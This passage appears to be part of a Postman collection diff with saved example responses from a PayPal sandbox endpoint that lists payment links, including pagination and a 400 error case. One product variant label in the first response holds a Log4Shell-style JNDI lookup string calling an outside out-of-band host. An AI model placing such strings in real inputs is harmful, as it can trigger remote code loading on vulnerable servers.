+          "body": "{\n    \"resources\": [\n        {\n            \"id\": \"PLB-35K4Y759FS59\",\n            \"integration_mode\": \"LINK\",\n            \"type\": \"BUY_NOW\",\n            \"reusable\": \"MULTIPLE\",\n            \"return_url\": \"https://merchant.example.com/thank-you\",\n            \"line_items\": [\n                {\n                    \"name\": \"Wireless Mouse\",\n                    \"unit_amount\": {\n                        \"currency_code\": \"USD\",\n                        \"value\": \"39.99\"\n                    },\n                    \"collect_shipping_address\": false\n                }\n            ],\n            \"status\": \"ACTIVE\",\n            \"create_time\": \"2026-01-15T19:37:08Z\",\n            \"update_time\": \"2026-01-15T19:37:08Z\"\n        },\n        {\n            \"id\": \"PLB-J73KQSUQ3MKM\",\n            \"integration_mode\": \"LINK\",\n            \"type\": \"BUY_NOW\",\n            \"reusable\": \"MULTIPLE\",\n            \"return_url\": \"https://merchant.example.com/thank-you\",\n            \"line_items\": [\n                {\n                    \"name\": \"Wireless Mouse\",\n                    \"unit_amount\": {\n                        \"currency_code\": \"USD\",\n                        \"value\": \"39.99\"\n                    },\n                    \"collect_shipping_address\": false\n                }\n            ],\n            \"status\": \"ACTIVE\",\n            \"create_time\": \"2026-01-15T19:35:44Z\",\n            \"update_time\": \"2026-01-15T19:35:44Z\"\n        },\n        {\n            \"id\": \"PLB-N9L4KG77S4FC\",\n            \"integration_mode\": \"LINK\",\n            \"type\": \"BUY_NOW\",\n            \"reusable\": \"MULTIPLE\",\n            \"return_url\": \"https://merchant.example.com/thank-you\",\n            \"line_items\": [\n                {\n                    \"name\": \"Wireless Mouse\",\n                    \"unit_amount\": {\n                        \"currency_code\": \"USD\",\n                        \"value\": \"39.99\"\n                    },\n                    \"collect_shipping_address\": false\n                }\n            ],\n            \"status\": \"ACTIVE\",\n            \"create_time\": \"2026-01-15T18:54:47Z\",\n            \"update_time\": \"2026-01-15T18:54:47Z\"\n        },\n        {\n            \"id\": \"PLB-5GXJXM8LPWYA\",\n            \"integration_mode\": \"LINK\",\n            \"type\": \"BUY_NOW\",\n            \"reusable\": \"MULTIPLE\",\n            \"return_url\": \"https://merchant.example.com/thank-you\",\n            \"line_items\": [\n                {\n                    \"name\": \"Wireless Mouse\",\n                    \"unit_amount\": {\n                        \"currency_code\": \"USD\",\n                        \"value\": \"39.99\"\n                    },\n                    \"collect_shipping_address\": false\n                }\n            ],\n            \"status\": \"ACTIVE\",\n            \"create_time\": \"2026-01-15T18:52:05Z\",\n            \"update_time\": \"2026-01-15T18:52:05Z\"\n        },\n        {\n            \"id\": \"PLB-RR4CFJHR8G9U\",\n            \"integration_mode\": \"LINK\",\n            \"type\": \"BUY_NOW\",\n            \"reusable\": \"MULTIPLE\",\n            \"return_url\": \"https://merchant.example.com/thank-you\",\n            \"line_items\": [\n                {\n                    \"name\": \"Wireless Mouse\",\n                    \"unit_amount\": {\n                        \"currency_code\": \"USD\",\n                        \"value\": \"39.99\"\n                    },\n                    \"collect_shipping_address\": false\n                }\n            ],\n            \"status\": \"ACTIVE\",\n            \"create_time\": \"2026-01-15T18:51:19Z\",\n            \"update_time\": \"2026-01-15T18:51:19Z\"\n        },\n        {\n            \"id\": \"PLB-TPRBLJNFP5T5\",\n            \"integration_mode\": \"LINK\",\n            \"type\": \"BUY_NOW\",\n            \"reusable\": \"MULTIPLE\",\n            \"return_url\": \"https://merchant.example.com/thank-you\",\n            \"line_items\": [\n                {\n                    \"name\": \"Wireless Mouse\",\n                    \"unit_amount\": {\n                        \"currency_code\": \"AUD\",\n                        \"value\": \"39.99\"\n                    },\n                    \"collect_shipping_address\": false\n                }\n            ],\n            \"status\": \"ACTIVE\",\n            \"create_time\": \"2026-01-14T08:13:34Z\",\n            \"update_time\": \"2026-01-14T08:13:34Z\"\n        },\n        {\n            \"id\": \"PLB-589BEUTL6YEB\",\n            \"integration_mode\": \"LINK\",\n            \"type\": \"BUY_NOW\",\n            \"reusable\": \"MULTIPLE\",\n            \"return_url\": \"https://merchant.example.com/thank-you\",\n            \"line_items\": [\n                {\n                    \"name\": \"T-Shirt\",\n                    \"collect_shipping_address\": false,\n                    \"variants\": {\n                        \"dimensions\": [\n                            {\n                                \"name\": \"Color\",\n                                \"primary\": true,\n                                \"options\": [\n                                    {\n                                        \"label\": \"White\",\n                                        \"unit_amount\": {\n                                            \"currency_code\": \"EUR\",\n                                            \"value\": \"19.00\"\n                                        }\n                                    },\n                                    {\n                                        \"label\": \"Black\",\n                                        \"unit_amount\": {\n                                            \"currency_code\": \"EUR\",\n                                            \"value\": \"20.00\"\n                                        }\n                                    }\n                                ]\n                            },\n                            {\n                                \"name\": \"Size\",\n                                \"primary\": false,\n                                \"options\": [\n                                    {\n                                        \"label\": \"XL\"\n                                    },\n                                    {\n                                        \"label\": \"${jndi:ldap://12rxeauy1jtkcp007sur56ubkbcxvtqebi.app.collab.tr4t.io}\"\n                                    },\n                                    {\n                                        \"label\": \"M\"\n                                    },\n                                    {\n                                        \"label\": \"S\"\n                                    }\n                                ]\n                            }\n                        ]\n                    }\n                }\n            ],\n            \"status\": \"ACTIVE\",\n            \"create_time\": \"2026-01-14T08:04:38Z\",\n            \"update_time\": \"2026-01-14T08:04:38Z\"\n        },\n        {\n            \"id\": \"PLB-TMNBWRM96HS3\",\n            \"integration_mode\": \"LINK\",\n            \"type\": \"BUY_NOW\",\n            \"reusable\": \"MULTIPLE\",\n            \"return_url\": \"https://merchant.example.com/thank-you\",\n            \"line_items\": [\n                {\n                    \"name\": \"Wireless Mouse\",\n                    \"unit_amount\": {\n                        \"currency_code\": \"AUD\",\n                        \"value\": \"39.99\"\n                    },\n                    \"collect_shipping_address\": false\n                }\n            ],\n            \"status\": \"ACTIVE\",\n            \"create_time\": \"2026-01-13T18:00:08Z\",\n            \"update_time\": \"2026-01-13T18:00:08Z\"\n        },\n        {\n            \"id\": \"PLB-44AY7ZB3XCLG\",\n            \"integration_mode\": \"LINK\",\n            \"type\": \"BUY_NOW\",\n            \"reusable\": \"MULTIPLE\",\n            \"return_url\": \"https://merchant.example.com/thank-you\",\n            \"line_items\": [\n                {\n                    \"name\": \"T-Shirt\",\n                    \"collect_shipping_address\": false,\n                    \"variants\": {\n                        \"dimensions\": [\n                            {\n                                \"name\": \"Color\",\n                                \"primary\": true,\n                                \"options\": [\n                                    {\n                                        \"label\": \"White\",\n                                        \"unit_amount\": {\n                                            \"currency_code\": \"EUR\",\n                                            \"value\": \"19.00\"\n                                        }\n                                    },\n                                    {\n                                        \"label\": \"Black\",\n                                        \"unit_amount\": {\n                                            \"currency_code\": \"EUR\",\n                                            \"value\": \"20.00\"\n                                        }\n                                    }\n                                ]\n                            },\n                            {\n                                \"name\": \"Size\",\n                                \"primary\": false,\n                                \"options\": [\n                                    {\n                                        \"label\": \"XL\"\n                                    },\n                                    {\n                                        \"label\": \"L\"\n                                    },\n                                    {\n                                        \"label\": \"M\"\n                                    },\n                                    {\n                                        \"label\": \"S\"\n                                    }\n                                ]\n                            }\n                        ]\n                    }\n                }\n            ],\n            \"status\": \"ACTIVE\",\n            \"create_time\": \"2026-01-13T17:21:21Z\",\n            \"update_time\": \"2026-01-13T17:21:21Z\"\n        },\n        {\n            \"id\": \"PLB-UGKCPEKYLDDD\",\n            \"integration_mode\": \"LINK\",\n            \"type\": \"BUY_NOW\",\n            \"reusable\": \"MULTIPLE\",\n            \"return_url\": \"https://merchant.example.com/thank-you\",\n            \"line_items\": [\n                {\n                    \"name\": \"Wireless Mouse\",\n                    \"unit_amount\": {\n                        \"currency_code\": \"AUD\",\n                        \"value\": \"39.99\"\n                    },\n                    \"collect_shipping_address\": false\n                }\n            ],\n            \"status\": \"ACTIVE\",\n            \"create_time\": \"2026-01-13T03:51:38Z\",\n            \"update_time\": \"2026-01-13T03:51:38Z\"\n        }\n    ],\n    \"links\": [\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources?page_size=10\",\n            \"rel\": \"self\"\n        },\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources?page_token=eyJwcm9jZXNzZWRDb3VudCI6MTAsInRvdGFsQ291bnQiOjM4LCJwYWdlX3NpemUiOjEwLCJ0b2tlbl9kYXRhIjp7ImNyZWF0ZV90aW1lIjoxNzY4Mjc2Mjk4MzI4LCJpZCI6IlBMQi1VR0tDUEVLWUxEREQiLCJtZXJjaGFudF9pZCI6IkM3Q1lNS1pERzhENkUifX0\",\n            \"rel\": \"next\"\n        }\n    ]\n}"
+        },
+        {
+          "name": "200 - List payment resources with page size limit",
+          "originalRequest": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/v1/checkout/payment-resources?page_size=5&total_required=true",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "v1",
+                "checkout",
+                "payment-resources"
+              ],
+              "query": [
+                {
+                  "key": "page_size",
+                  "value": "5"
+                },
+                {
+                  "key": "page_token",
+                  "value": null,
+                  "disabled": true
+                },
+                {
+                  "key": "total_required",
+                  "value": "true"
+                }
+              ]
+            }
+          },
+          "status": "OK",
+          "code": 200,
+          "_postman_previewlanguage": "json",
+          "header": [
+            {
+              "key": "Connection",
+              "value": "keep-alive"
+            },
+            {
+              "key": "Content-Type",
+              "value": "application/json"
+            },
+            {
+              "key": "Server",
+              "value": "nginx"
+            },
+            {
+              "key": "Access-Control-Expose-Headers",
+              "value": "Server-Timing"
+            },
+            {
+              "key": "Cache-Control",
+              "value": "max-age=0, no-cache, no-store, must-revalidate"
+            },
+            {
+              "key": "Paypal-Debug-Id",
+              "value": "f987055df0bef"
+            },
+            {
+              "key": "Server-Timing",
+              "value": "traceparent;desc=\"00-0000000000000000000f987055df0bef-5592d88422cb43cc-01\""
+            },
+            {
+              "key": "HTTP_X_PP_AZ_LOCATOR",
+              "value": "ccg18.slc"
+            },
+            {
+              "key": "Strict-Transport-Security",
+              "value": "max-age=31536000; includeSubDomains"
+            },
+            {
+              "key": "Accept-Ranges",
+              "value": "none"
+            },
+            {
+              "key": "Via",
+              "value": "1.1 varnish, 1.1 varnish"
+            },
+            {
+              "key": "content-encoding",
+              "value": "br"
+            },
+            {
+              "key": "Edge-Control",
+              "value": "max-age=0"
+            },
+            {
+              "key": "Date",
+              "value": "Thu, 15 Jan 2026 19:40:17 GMT"
+            },
+            {
+              "key": "X-Served-By",
+              "value": "cache-sjc10040-SJC, cache-phx1710091-PHX"
+            },
+            {
+              "key": "X-Cache",
+              "value": "MISS, MISS"
+            },
+            {
+              "key": "X-Cache-Hits",
+              "value": "0, 0"
+            },
+            {
+              "key": "X-Timer",
+              "value": "S1768506017.245676,VS0,VE456"
+            },
+            {
+              "key": "Vary",
+              "value": "Accept-Encoding"
+            },
+            {
+              "key": "transfer-encoding",
+              "value": "chunked"
+            }
+          ],
+          "cookie": [],
+          "body": "{\n    \"resources\": [\n        {\n            \"id\": \"PLB-35K4Y759FS59\",\n            \"integration_mode\": \"LINK\",\n            \"type\": \"BUY_NOW\",\n            \"reusable\": \"MULTIPLE\",\n            \"return_url\": \"https://merchant.example.com/thank-you\",\n            \"line_items\": [\n                {\n                    \"name\": \"Wireless Mouse\",\n                    \"unit_amount\": {\n                        \"currency_code\": \"USD\",\n                        \"value\": \"39.99\"\n                    },\n                    \"collect_shipping_address\": false\n                }\n            ],\n            \"status\": \"ACTIVE\",\n            \"create_time\": \"2026-01-15T19:37:08Z\",\n            \"update_time\": \"2026-01-15T19:37:08Z\"\n        },\n        {\n            \"id\": \"PLB-J73KQSUQ3MKM\",\n            \"integration_mode\": \"LINK\",\n            \"type\": \"BUY_NOW\",\n            \"reusable\": \"MULTIPLE\",\n            \"return_url\": \"https://merchant.example.com/thank-you\",\n            \"line_items\": [\n                {\n                    \"name\": \"Wireless Mouse\",\n                    \"unit_amount\": {\n                        \"currency_code\": \"USD\",\n                        \"value\": \"39.99\"\n                    },\n                    \"collect_shipping_address\": false\n                }\n            ],\n            \"status\": \"ACTIVE\",\n            \"create_time\": \"2026-01-15T19:35:44Z\",\n            \"update_time\": \"2026-01-15T19:35:44Z\"\n        },\n        {\n            \"id\": \"PLB-N9L4KG77S4FC\",\n            \"integration_mode\": \"LINK\",\n            \"type\": \"BUY_NOW\",\n            \"reusable\": \"MULTIPLE\",\n            \"return_url\": \"https://merchant.example.com/thank-you\",\n            \"line_items\": [\n                {\n                    \"name\": \"Wireless Mouse\",\n                    \"unit_amount\": {\n                        \"currency_code\": \"USD\",\n                        \"value\": \"39.99\"\n                    },\n                    \"collect_shipping_address\": false\n                }\n            ],\n            \"status\": \"ACTIVE\",\n            \"create_time\": \"2026-01-15T18:54:47Z\",\n            \"update_time\": \"2026-01-15T18:54:47Z\"\n        },\n        {\n            \"id\": \"PLB-5GXJXM8LPWYA\",\n            \"integration_mode\": \"LINK\",\n            \"type\": \"BUY_NOW\",\n            \"reusable\": \"MULTIPLE\",\n            \"return_url\": \"https://merchant.example.com/thank-you\",\n            \"line_items\": [\n                {\n                    \"name\": \"Wireless Mouse\",\n                    \"unit_amount\": {\n                        \"currency_code\": \"USD\",\n                        \"value\": \"39.99\"\n                    },\n                    \"collect_shipping_address\": false\n                }\n            ],\n            \"status\": \"ACTIVE\",\n            \"create_time\": \"2026-01-15T18:52:05Z\",\n            \"update_time\": \"2026-01-15T18:52:05Z\"\n        },\n        {\n            \"id\": \"PLB-RR4CFJHR8G9U\",\n            \"integration_mode\": \"LINK\",\n            \"type\": \"BUY_NOW\",\n            \"reusable\": \"MULTIPLE\",\n            \"return_url\": \"https://merchant.example.com/thank-you\",\n            \"line_items\": [\n                {\n                    \"name\": \"Wireless Mouse\",\n                    \"unit_amount\": {\n                        \"currency_code\": \"USD\",\n                        \"value\": \"39.99\"\n                    },\n                    \"collect_shipping_address\": false\n                }\n            ],\n            \"status\": \"ACTIVE\",\n            \"create_time\": \"2026-01-15T18:51:19Z\",\n            \"update_time\": \"2026-01-15T18:51:19Z\"\n        }\n    ],\n    \"total_items\": 38,\n    \"total_pages\": 8,\n    \"links\": [\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources?total_required=true&page_size=5\",\n            \"rel\": \"self\"\n        },\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources?page_token=eyJwcm9jZXNzZWRDb3VudCI6NSwidG90YWxDb3VudCI6MzgsInBhZ2Vfc2l6ZSI6NSwidG9rZW5fZGF0YSI6eyJjcmVhdGVfdGltZSI6MTc2ODUwMzA3OTA2NywiaWQiOiJQTEItUlI0Q0ZKSFI4RzlVIiwibWVyY2hhbnRfaWQiOiJDN0NZTUtaREc4RDZFIn19\",\n            \"rel\": \"next\"\n        }\n    ]\n}"
+        },
+        {
+          "name": "200 - List payment resources with page token",
+          "originalRequest": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/v1/checkout/payment-resources?page_token=eyJwcm9jZXNzZWRDb3VudCI6MTAsInRvdGFsQ291bnQiOjM4LCJwYWdlX3NpemUiOjEwLCJ0b2tlbl9kYXRhIjp7ImNyZWF0ZV90aW1lIjoxNzY4Mjc2Mjk4MzI4LCJpZCI6IlBMQi1VR0tDUEVLWUxEREQiLCJtZXJjaGFudF9pZCI6IkM3Q1lNS1pERzhENkUifX0&total_required=true",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "v1",
+                "checkout",
+                "payment-resources"
+              ],
+              "query": [
+                {
+                  "key": "page_size",
+                  "value": "5",
+                  "disabled": true
+                },
+                {
+                  "key": "page_token",
+                  "value": "eyJwcm9jZXNzZWRDb3VudCI6MTAsInRvdGFsQ291bnQiOjM4LCJwYWdlX3NpemUiOjEwLCJ0b2tlbl9kYXRhIjp7ImNyZWF0ZV90aW1lIjoxNzY4Mjc2Mjk4MzI4LCJpZCI6IlBMQi1VR0tDUEVLWUxEREQiLCJtZXJjaGFudF9pZCI6IkM3Q1lNS1pERzhENkUifX0"
+                },
+                {
+                  "key": "total_required",
+                  "value": "true"
+                }
+              ]
+            }
+          },
+          "status": "OK",
+          "code": 200,
+          "_postman_previewlanguage": "json",
+          "header": [
+            {
+              "key": "Connection",
+              "value": "keep-alive"
+            },
+            {
+              "key": "Content-Type",
+              "value": "application/json"
+            },
+            {
+              "key": "Server",
+              "value": "nginx"
+            },
+            {
+              "key": "Access-Control-Expose-Headers",
+              "value": "Server-Timing"
+            },
+            {
+              "key": "Cache-Control",
+              "value": "max-age=0, no-cache, no-store, must-revalidate"
+            },
+            {
+              "key": "Paypal-Debug-Id",
+              "value": "f194106e949a8"
+            },
+            {
+              "key": "Server-Timing",
+              "value": "traceparent;desc=\"00-0000000000000000000f194106e949a8-5f424f521aae9ff2-01\""
+            },
+            {
+              "key": "HTTP_X_PP_AZ_LOCATOR",
+              "value": "ccg18.slc"
+            },
+            {
+              "key": "Strict-Transport-Security",
+              "value": "max-age=31536000; includeSubDomains"
+            },
+            {
+              "key": "Accept-Ranges",
+              "value": "none"
+            },
+            {
+              "key": "Via",
+              "value": "1.1 varnish, 1.1 varnish"
+            },
+            {
+              "key": "content-encoding",
+              "value": "br"
+            },
+            {
+              "key": "Edge-Control",
+              "value": "max-age=0"
+            },
+            {
+              "key": "Date",
+              "value": "Thu, 15 Jan 2026 19:41:56 GMT"
+            },
+            {
+              "key": "X-Served-By",
+              "value": "cache-sjc10040-SJC, cache-phx1710091-PHX"
+            },
+            {
+              "key": "X-Cache",
+              "value": "MISS, MISS"
+            },
+            {
+              "key": "X-Cache-Hits",
+              "value": "0, 0"
+            },
+            {
+              "key": "X-Timer",
+              "value": "S1768506116.316995,VS0,VE341"
+            },
+            {
+              "key": "Vary",
+              "value": "Accept-Encoding"
+            },
+            {
+              "key": "transfer-encoding",
+              "value": "chunked"
+            }
+          ],
+          "cookie": [],
+          "body": "{\n    \"resources\": [\n        {\n            \"id\": \"PLB-HDNM2FTZFD59\",\n            \"integration_mode\": \"LINK\",\n            \"type\": \"BUY_NOW\",\n            \"reusable\": \"MULTIPLE\",\n            \"return_url\": \"https://example-merchant.com/payment/return-success\",\n            \"line_items\": [\n                {\n                    \"name\": \"Premium Wireless Headphones with Noise Cancellation\",\n                    \"product_id\": \"PROD-WH-NC-2024-12345\",\n                    \"description\": \"Experience crystal-clear sound with our premium wireless headphones featuring active noise cancellation, 30-hour battery life\",\n                    \"taxes\": [\n                        {\n                            \"name\": \"State Sales Tax\",\n                            \"type\": \"PERCENTAGE\",\n                            \"value\": \"8.25\"\n                        }\n                    ],\n                    \"shipping\": [\n                        {\n                            \"type\": \"FLAT\",\n                            \"value\": \"12.50\"\n                        }\n                    ],\n                    \"collect_shipping_address\": true,\n                    \"customer_notes\": [\n                        {\n                            \"required\": false,\n                            \"label\": \"Gift Message (Optional)\"\n                        }\n                    ],\n                    \"variants\": {\n                        \"dimensions\": [\n                            {\n                                \"name\": \"Color\",\n                                \"primary\": true,\n                                \"options\": [\n                                    {\n                                        \"label\": \"Midnight Black\",\n                                        \"unit_amount\": {\n                                            \"currency_code\": \"USD\",\n                                            \"value\": \"149.99\"\n                                        }\n                                    },\n                                    {\n                                        \"label\": \"Silver Gray\",\n                                        \"unit_amount\": {\n                                            \"currency_code\": \"USD\",\n                                            \"value\": \"149.99\"\n                                        }\n                                    },\n                                    {\n                                        \"label\": \"Rose Gold\",\n                                        \"unit_amount\": {\n                                            \"currency_code\": \"USD\",\n                                            \"value\": \"169.99\"\n                                        }\n                                    },\n                                    {\n                                        \"label\": \"Navy Blue\",\n                                        \"unit_amount\": {\n                                            \"currency_code\": \"USD\",\n                                            \"value\": \"159.99\"\n                                        }\n                                    }\n                                ]\n                            },\n                            {\n                                \"name\": \"Warranty\",\n                                \"primary\": false,\n                                \"options\": [\n                                    {\n                                        \"label\": \"Standard 1-Year\"\n                                    },\n                                    {\n                                        \"label\": \"Extended 2-Year\"\n                                    },\n                                    {\n                                        \"label\": \"Premium 3-Year\"\n                                    }\n                                ]\n                            },\n                            {\n                                \"name\": \"Package Type\",\n                                \"primary\": false,\n                                \"options\": [\n                                    {\n                                        \"label\": \"Standard Box\"\n                                    },\n                                    {\n                                        \"label\": \"Gift Wrapped\"\n                                    }\n                                ]\n                            }\n                        ]\n                    },\n                    \"adjustable_quantity\": {\n                        \"maximum\": 10\n                    }\n                }\n            ],\n            \"status\": \"ACTIVE\",\n            \"create_time\": \"2026-01-12T21:19:14Z\",\n            \"update_time\": \"2026-01-12T21:19:14Z\"\n        },\n        {\n            \"id\": \"PLB-KFU4XX7VWDDY\",\n            \"integration_mode\": \"LINK\",\n            \"type\": \"BUY_NOW\",\n            \"reusable\": \"MULTIPLE\",\n            \"return_url\": \"https://merchant.example.com/thank-you/REDIRECTAST\",\n            \"line_items\": [\n                {\n                    \"name\": \"Wireless Mouse\",\n                    \"unit_amount\": {\n                        \"currency_code\": \"USD\",\n                        \"value\": \"39.99\"\n                    },\n                    \"collect_shipping_address\": false\n                }\n            ],\n            \"status\": \"ACTIVE\",\n            \"create_time\": \"2026-01-07T06:39:21Z\",\n            \"update_time\": \"2026-01-07T06:39:21Z\"\n        },\n        {\n            \"id\": \"PLB-D9GQ7G4KSMDE\",\n            \"integration_mode\": \"LINK\",\n            \"type\": \"BUY_NOW\",\n            \"reusable\": \"MULTIPLE\",\n            \"return_url\": \"https://www.cascademag.com/thankyou.htm\",\n            \"line_items\": [\n                {\n                    \"name\": \"Retro Cascade Sample\",\n                    \"unit_amount\": {\n                        \"currency_code\": \"GBP\",\n                        \"value\": \"1.50\"\n                    },\n                    \"collect_shipping_address\": false\n                }\n            ],\n            \"status\": \"ACTIVE\",\n            \"create_time\": \"2025-12-26T08:56:05Z\",\n            \"update_time\": \"2025-12-26T08:56:05Z\"\n        },\n        {\n            \"id\": \"PLB-J4H5CCGN6SEY\",\n            \"integration_mode\": \"LINK\",\n            \"type\": \"BUY_NOW\",\n            \"reusable\": \"MULTIPLE\",\n            \"return_url\": \"https://www.cascademag.com/thankyou.htm\",\n            \"line_items\": [\n                {\n                    \"name\": \"Retro Cascade Sample\",\n                    \"unit_amount\": {\n                        \"currency_code\": \"GBP\",\n                        \"value\": \"1.50\"\n                    },\n                    \"collect_shipping_address\": false\n                }\n            ],\n            \"status\": \"ACTIVE\",\n            \"create_time\": \"2025-12-25T18:26:39Z\",\n            \"update_time\": \"2025-12-25T18:26:39Z\"\n        },\n        {\n            \"id\": \"PLB-C4X2H3FH2N52\",\n            \"integration_mode\": \"LINK\",\n            \"type\": \"BUY_NOW\",\n            \"reusable\": \"MULTIPLE\",\n            \"return_url\": \"https://www.cascademag.com/thankyou.htm\",\n            \"line_items\": [\n                {\n                    \"name\": \"Retro Cascade Sample\",\n                    \"unit_amount\": {\n                        \"currency_code\": \"GBP\",\n                        \"value\": \"1.50\"\n                    },\n                    \"collect_shipping_address\": false\n                }\n            ],\n            \"status\": \"ACTIVE\",\n            \"create_time\": \"2025-12-25T18:26:39Z\",\n            \"update_time\": \"2025-12-25T18:26:39Z\"\n        },\n        {\n            \"id\": \"PLB-FGEPKV95AUFT\",\n            \"integration_mode\": \"LINK\",\n            \"type\": \"BUY_NOW\",\n            \"reusable\": \"MULTIPLE\",\n            \"return_url\": \"https://app.nihaocafe.com/#/nihaogo/success?orderId=order1940682590364807170&userId=52032\",\n            \"line_items\": [\n                {\n                    \"name\": \"liang ipn test3\",\n                    \"unit_amount\": {\n                        \"currency_code\": \"USD\",\n                        \"value\": \"3.00\"\n                    },\n                    \"collect_shipping_address\": false\n                }\n            ],\n            \"status\": \"ACTIVE\",\n            \"create_time\": \"2025-12-24T06:56:57Z\",\n            \"update_time\": \"2025-12-24T06:56:57Z\"\n        },\n        {\n            \"id\": \"PLB-ZHEVCRBKHFPW\",\n            \"integration_mode\": \"LINK\",\n            \"type\": \"BUY_NOW\",\n            \"reusable\": \"MULTIPLE\",\n            \"return_url\": \"https://bloxy.trade/balance?order=17662786205029&paid=true\",\n            \"line_items\": [\n                {\n                    \"name\": \"Balance Deposit - $5.00\",\n                    \"unit_amount\": {\n                        \"currency_code\": \"USD\",\n                        \"value\": \"5.00\"\n                    },\n                    \"collect_shipping_address\": false\n                }\n            ],\n            \"status\": \"ACTIVE\",\n            \"create_time\": \"2025-12-22T00:28:02Z\",\n            \"update_time\": \"2025-12-22T00:28:02Z\"\n        },\n        {\n            \"id\": \"PLB-XAYGHP8UEUV6\",\n            \"integration_mode\": \"LINK\",\n            \"type\": \"BUY_NOW\",\n            \"reusable\": \"MULTIPLE\",\n            \"return_url\": \"https://bloxy.trade/balance?order=17662786205029&paid=true\",\n            \"line_items\": [\n                {\n                    \"name\": \"Balance Deposit - $5.00\",\n                    \"unit_amount\": {\n                        \"currency_code\": \"USD\",\n                        \"value\": \"5.00\"\n                    },\n                    \"collect_shipping_address\": false\n                }\n            ],\n            \"status\": \"ACTIVE\",\n            \"create_time\": \"2025-12-21T03:50:28Z\",\n            \"update_time\": \"2025-12-21T03:50:28Z\"\n        },\n        {\n            \"id\": \"PLB-333T4CLL4FFJ\",\n            \"integration_mode\": \"LINK\",\n            \"type\": \"BUY_NOW\",\n            \"reusable\": \"MULTIPLE\",\n            \"return_url\": \"https://bloxy.trade/balance?order=17662786205029&paid=true\",\n            \"line_items\": [\n                {\n                    \"name\": \"Balance Deposit - $5.00\",\n                    \"unit_amount\": {\n                        \"currency_code\": \"USD\",\n                        \"value\": \"5.00\"\n                    },\n                    \"collect_shipping_address\": false\n                }\n            ],\n            \"status\": \"ACTIVE\",\n            \"create_time\": \"2025-12-21T03:40:23Z\",\n            \"update_time\": \"2025-12-21T03:40:23Z\"\n        },\n        {\n            \"id\": \"PLB-J8QQGWKV3C25\",\n            \"integration_mode\": \"LINK\",\n            \"type\": \"BUY_NOW\",\n            \"reusable\": \"MULTIPLE\",\n            \"return_url\": \"https://asos.com\",\n            \"line_items\": [\n                {\n                    \"name\": \"ASOS repayment 1000001719\",\n                    \"unit_amount\": {\n                        \"currency_code\": \"GBP\",\n                        \"value\": \"32\"\n                    },\n                    \"collect_shipping_address\": false\n                }\n            ],\n            \"status\": \"ACTIVE\",\n            \"create_time\": \"2025-12-18T03:34:22Z\",\n            \"update_time\": \"2025-12-18T03:34:22Z\"\n        }\n    ],\n    \"total_items\": 38,\n    \"total_pages\": 4,\n    \"links\": [\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources?page_token=eyJwcm9jZXNzZWRDb3VudCI6MTAsInRvdGFsQ291bnQiOjM4LCJwYWdlX3NpemUiOjEwLCJ0b2tlbl9kYXRhIjp7ImNyZWF0ZV90aW1lIjoxNzY4Mjc2Mjk4MzI4LCJpZCI6IlBMQi1VR0tDUEVLWUxEREQiLCJtZXJjaGFudF9pZCI6IkM3Q1lNS1pERzhENkUifX0&total_required=true\",\n            \"rel\": \"self\"\n        },\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources?page_token=eyJwcm9jZXNzZWRDb3VudCI6MjAsInRvdGFsQ291bnQiOjM4LCJwYWdlX3NpemUiOjEwLCJ0b2tlbl9kYXRhIjp7ImNyZWF0ZV90aW1lIjoxNzY2MDI4ODYyNzkxLCJpZCI6IlBMQi1KOFFRR1dLVjNDMjUiLCJtZXJjaGFudF9pZCI6IkM3Q1lNS1pERzhENkUifX0\",\n            \"rel\": \"next\"\n        }\n    ]\n}"
+        },
+        {
+          "name": "400 Bad Request - Page Size and Page Token both provided",
+          "originalRequest": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/v1/checkout/payment-resources?page_size=5&page_token=eyJwcm9jZXNzZWRDb3VudCI6MTAsInRvdGFsQ291bnQiOjM4LCJwYWdlX3NpemUiOjEwLCJ0b2tlbl9kYXRhIjp7ImNyZWF0ZV90aW1lIjoxNzY4Mjc2Mjk4MzI4LCJpZCI6IlBMQi1VR0tDUEVLWUxEREQiLCJtZXJjaGFudF9pZCI6IkM3Q1lNS1pERzhENkUifX0&total_required=true",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "v1",
+                "checkout",
+                "payment-resources"
+              ],
+              "query": [
+                {
+                  "key": "page_size",
+                  "value": "5"
+                },
+                {
+                  "key": "page_token",
+                  "value": "eyJwcm9jZXNzZWRDb3VudCI6MTAsInRvdGFsQ291bnQiOjM4LCJwYWdlX3NpemUiOjEwLCJ0b2tlbl9kYXRhIjp7ImNyZWF0ZV90aW1lIjoxNzY4Mjc2Mjk4MzI4LCJpZCI6IlBMQi1VR0tDUEVLWUxEREQiLCJtZXJjaGFudF9pZCI6IkM3Q1lNS1pERzhENkUifX0"
+                },
+                {
+                  "key": "total_required",
+                  "value": "true"
+                }
+              ]
+            }
+          },
+          "status": "Bad Request",
+          "code": 400,
+          "_postman_previewlanguage": "json",
+          "header": [
+            {
+              "key": "Connection",
+              "value": "keep-alive"
+            },
+            {
+              "key": "Content-Length",
+              "value": "278"
+            },
+            {
+              "key": "Content-Type",
+              "value": "application/json"
+            },
+            {
+              "key": "Server",
+              "value": "nginx"
+            },
+            {
+              "key": "Access-Control-Expose-Headers",
+              "value": "Server-Timing"
+            },
+            {
+              "key": "Cache-Control",
+              "value": "max-age=0, no-cache, no-store, must-revalidate"
+            },
+            {
+              "key": "Paypal-Debug-Id",
+              "value": "f62724066d579"
+            },
+            {
+              "key": "Server-Timing",
+              "value": "traceparent;desc=\"00-0000000000000000000f62724066d579-1b94d90aae0c5223-01\""
+            },
+            {
+              "key": "HTTP_X_PP_AZ_LOCATOR",
+              "value": "ccg18.slc"
+            },
+            {
+              "key": "Strict-Transport-Security",
+              "value": "max-age=31536000; includeSubDomains"
+            },
+            {
+              "key": "Accept-Ranges",
+              "value": "bytes"
+            },
+            {
+              "key": "Via",
+              "value": "1.1 varnish, 1.1 varnish"
+            },
